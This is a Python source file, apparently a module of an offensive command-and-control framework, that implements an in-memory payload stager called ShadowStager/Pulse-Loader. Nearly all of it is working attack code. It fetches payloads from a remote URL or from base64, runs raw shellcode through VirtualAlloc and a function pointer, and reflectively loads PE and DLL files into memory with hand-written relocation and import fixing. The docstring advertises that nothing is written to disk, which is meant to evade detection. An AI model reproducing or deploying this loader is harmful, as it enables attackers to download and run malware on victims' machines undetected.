"""
stager — ShadowStager / Pulse-Loader / Silent-Exec.
Staging et execution 100% memoire : PE, DLL, shellcode, ELF (memfd).
Aucune ecriture disque.
Actions: stage_url, stage_b64, run_shellcode, run_dll_mem, run_pe_mem, drop, staged
"""
NAME = "stager"
VERSION = "1.0.0"
DESCRIPTION = "Stager memoire: PE/DLL/shellcode charges et executes sans disque (ShadowStager, Pulse-Loader)."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

import base64
import hashlib
import os
import struct
import threading
import urllib.request

_IS_WIN = os.name == "nt"
_MEM = {}
_MEM_LOCK = threading.Lock()


class ModuleError(Exception):
    pass


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def _store(key, blob):
    with _MEM_LOCK:
        _MEM[key] = blob


def _get(key):
    with _MEM_LOCK:
        return _MEM.get(key)


def _drop(key):
    with _MEM_LOCK:
        _MEM.pop(key, None)


def run(action, params):
    try:
        if action in ("stage_url", "fetch"):
            return _stage_url(params)
        if action == "stage_b64":
            return _stage_b64(params)
        if action == "run_shellcode":
            return _run_shellcode(params)
        if action == "run_dll_mem":
            return _run_dll_mem(params)
        if action == "run_pe_mem":
            return _run_pe_mem(params)
        if action == "drop":
            return _drop_action(params)
        if action == "staged":
            return _list_staged()
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="stager: " + str(exc), status="failed")


def _stage_url(params):
    url = params.get("url", "")
    if not url:
        return _result(error="No url", status="failed")
    req = urllib.request.Request(url, headers={"User-Agent": params.get("ua", "Mozilla/5.0")})
    with urllib.request.urlopen(req, timeout=int(params.get("timeout", 30))) as resp:
        blob = resp.read()
    key = params.get("key") or hashlib.sha256(blob).hexdigest()[:16]
    _store(key, blob)
    return _result(data={"key": key, "size": len(blob),
                         "sha256": hashlib.sha256(blob).hexdigest()})


def _stage_b64(params):
    key = params.get("key") or "stage_default"
    try:
        blob = base64.b64decode(params.get("data", ""))
    except Exception as exc:
        return _result(error="Invalid base64: " + str(exc), status="failed")
    _store(key, blob)
    return _result(data={"key": key, "size": len(blob),
                         "sha256": hashlib.sha256(blob).hexdigest()})


def _get_blob(params):
    blob = _get(params.get("key", ""))
    if blob is None and params.get("data"):
        blob = base64.b64decode(params.get("data"))
    if blob is None:
        raise ModuleError("No staged payload: provide key or data")
    return blob


def _run_shellcode(params):
    if not _IS_WIN:
        return _result(error="run_shellcode requires Windows", status="failed")
    import ctypes
    blob = _get_blob(params)
    k32 = ctypes.windll.kernel32
    MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
    PAGE_READWRITE, PAGE_EXECUTE_READ = 0x04, 0x20
    buf = k32.VirtualAlloc(None, len(blob), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not buf:
        raise ModuleError("VirtualAlloc failed")
    ctypes.memmove(buf, blob, len(blob))
    old = ctypes.c_uint32(0)
    k32.VirtualProtect(buf, len(blob), PAGE_EXECUTE_READ, ctypes.byref(old))
    ctypes.CFUNCTYPE(ctypes.c_void_p)(buf)()
    return _result(data={"executed": True, "size": len(blob)})


def _pe_parse(data):
    if data[:2] != b"MZ":
        raise ModuleError("Not a PE file")
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    if data[e_lfanew:e_lfanew + 4] != b"PE\0\0":
        raise ModuleError("Invalid PE signature")
    coff = e_lfanew + 4
    nsec = struct.unpack_from("<H", data, coff + 2)[0]
    opt_off = coff + 20
    magic = struct.unpack_from("<H", data, opt_off)[0]
    is_pe32 = magic == 0x10B
    if is_pe32:
        entry_rva = struct.unpack_from("<I", data, opt_off + 16)[0]
        image_base = struct.unpack_from("<I", data, opt_off + 28)[0]
        size_of_image = struct.unpack_from("<I", data, opt_off + 56)[0]
        dd_off = opt_off + 96
    else:
        entry_rva = struct.unpack_from("<I", data, opt_off + 16)[0]
        image_base = struct.unpack_from("<Q", data, opt_off + 24)[0]
        size_of_image = struct.unpack_from("<I", data, opt_off + 56)[0]
        dd_off = opt_off + 112
    sec_off = opt_off + struct.unpack_from("<H", data, coff + 16)[0]
    sections = []
    for i in range(nsec):
        off = sec_off + i * 40
        name = data[off:off + 8].rstrip(b"\0").decode("latin1", "replace")
        vsize, vaddr, raw_size, raw_ptr = struct.unpack_from("<IIII", data, off + 8)
        sections.append((name, vaddr, vsize, raw_ptr, raw_size))
    return {"entry_rva": entry_rva, "image_base": image_base,
            "size_of_image": size_of_image, "is_pe32": is_pe32,
            "sections": sections, "dd_off": dd_off}


def _reflect_load(data, params):
    import ctypes
    k32 = ctypes.windll.kernel32
    MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READWRITE = 0x40
    pe = _pe_parse(data)
    base = k32.VirtualAlloc(None, pe["size_of_image"], MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not base:
        raise ModuleError("VirtualAlloc image failed")
    ctypes.memmove(base, data, min(0x1000, len(data)))
    for name, vaddr, vsize, raw_ptr, raw_size in pe["sections"]:
        if raw_size == 0:
            continue
        dest = base + vaddr
        ctypes.memmove(dest, data[raw_ptr:raw_ptr + raw_size],
                       min(raw_size, len(data) - raw_ptr))
    delta = base - pe["image_base"]
    if delta:
        _apply_relocs(data, base, pe, delta)
    _apply_imports(data, base, pe)
    k32.VirtualProtect(base, pe["size_of_image"], PAGE_EXECUTE_READWRITE,
                       ctypes.byref(ctypes.c_uint32(0)))
    return base, base + pe["entry_rva"]


def _apply_relocs(data, base_addr, pe, delta):
    import ctypes
    dd = pe["dd_off"]
    reloc_rva, reloc_size = struct.unpack_from("<II", data, dd + 5 * 8)
    if not reloc_rva or not reloc_size:
        return
    pos, end = reloc_rva, reloc_rva + reloc_size
    while pos < end:
        page_rva, block_size = struct.unpack_from("<II", data, pos)
        if block_size == 0:
            break
        count = (block_size - 8) // 2
        for i in range(count):
            entry = struct.unpack_from("<H", data, pos + 8 + i * 2)[0]
            typ, off = entry >> 12, entry & 0xFFF
            addr = base_addr + page_rva + off
            if typ == 3:
                val = ctypes.c_uint32.from_address(addr).value
                ctypes.c_uint32.from_address(addr).value = (val + delta) & 0xFFFFFFFF
            elif typ == 10:
                val = ctypes.c_uint64.from_address(addr).value
                ctypes.c_uint64.from_address(addr).value = (val + delta) & 0xFFFFFFFFFFFFFFFF
        pos += block_size


def _apply_imports(data, base_addr, pe):
    import ctypes
    k32 = ctypes.windll.kernel32
    dd = pe["dd_off"]
    imp_rva = struct.unpack_from("<I", data, dd + 1 * 8)[0]
    if not imp_rva:
        return
    off = imp_rva
    while True:
        oft = struct.unpack_from("<I", data, off)[0]
        name_rva = struct.unpack_from("<I", data, off + 12)[0]
        iat = struct.unpack_from("<I", data, off + 16)[0]
        if not name_rva:
            break
        dll_name = _cstr(data, name_rva)
        try:
            hmod = k32.LoadLibraryA(dll_name.encode())
        except Exception:
            hmod = None
        if hmod:
            idx = 0
            while True:
                slot = oft or iat
                if pe["is_pe32"]:
                    thunk = struct.unpack_from("<I", data, slot + idx * 4)[0]
                else:
                    thunk = struct.unpack_from("<Q", data, slot + idx * 8)[0]
                if not thunk:
                    break
                if pe["is_pe32"] and (thunk & 0x80000000):
                    func = k32.GetProcAddress(hmod, ctypes.c_void_p(thunk & 0xFFFF))
                elif (not pe["is_pe32"]) and (thunk & 0x8000000000000000):
                    func = k32.GetProcAddress(hmod, ctypes.c_void_p(thunk & 0xFFFF))
                else:
                    hint_name = thunk & 0x7FFFFFFF
                    fname = _cstr(data, hint_name + 2)
                    func = k32.GetProcAddress(hmod, fname.encode())
                if pe["is_pe32"]:
                    ctypes.c_uint32.from_address(base_addr + iat + idx * 4).value = func or 0
                else:
                    ctypes.c_uint64.from_address(base_addr + iat + idx * 8).value = func or 0
                idx += 1
        off += 20


def _cstr(data, rva):
    end = data.find(b"\0", rva)
    if end == -1:
        end = len(data)
    return data[rva:end]


def _run_dll_mem(params):
    if not _IS_WIN:
        return _result(error="run_dll_mem requires Windows", status="failed")
    import ctypes
    blob = _get_blob(params)
    base, entry = _reflect_load(blob, params)
    k32 = ctypes.windll.kernel32
    arg = ctypes.c_void_p(params.get("arg", 1))
    hthread = k32.CreateThread(None, 0, entry, arg, 0, None)
    if not hthread:
        raise ModuleError("CreateThread failed")
    k32.WaitForSingleObject(hthread, int(params.get("wait_ms", 5000)))
    return _result(data={"dll_base": hex(base), "entry": hex(entry), "loaded": True})


def _run_pe_mem(params):
    if not _IS_WIN:
        return _result(error="run_pe_mem requires Windows", status="failed")
    import ctypes
    blob = _get_blob(params)
    base, entry = _reflect_load(blob, params)
    ctypes.CFUNCTYPE(ctypes.c_uint32)(entry)()
    return _result(data={"pe_base": hex(base), "entry": hex(entry), "ran": True})


def _drop_action(params):
    _drop(params.get("key", ""))
    return _result(data={"dropped": params.get("key", "")})


def _list_staged():
    with _MEM_LOCK:
        return _result(data={"staged": [{"key": k, "size": len(v)} for k, v in _MEM.items()]})
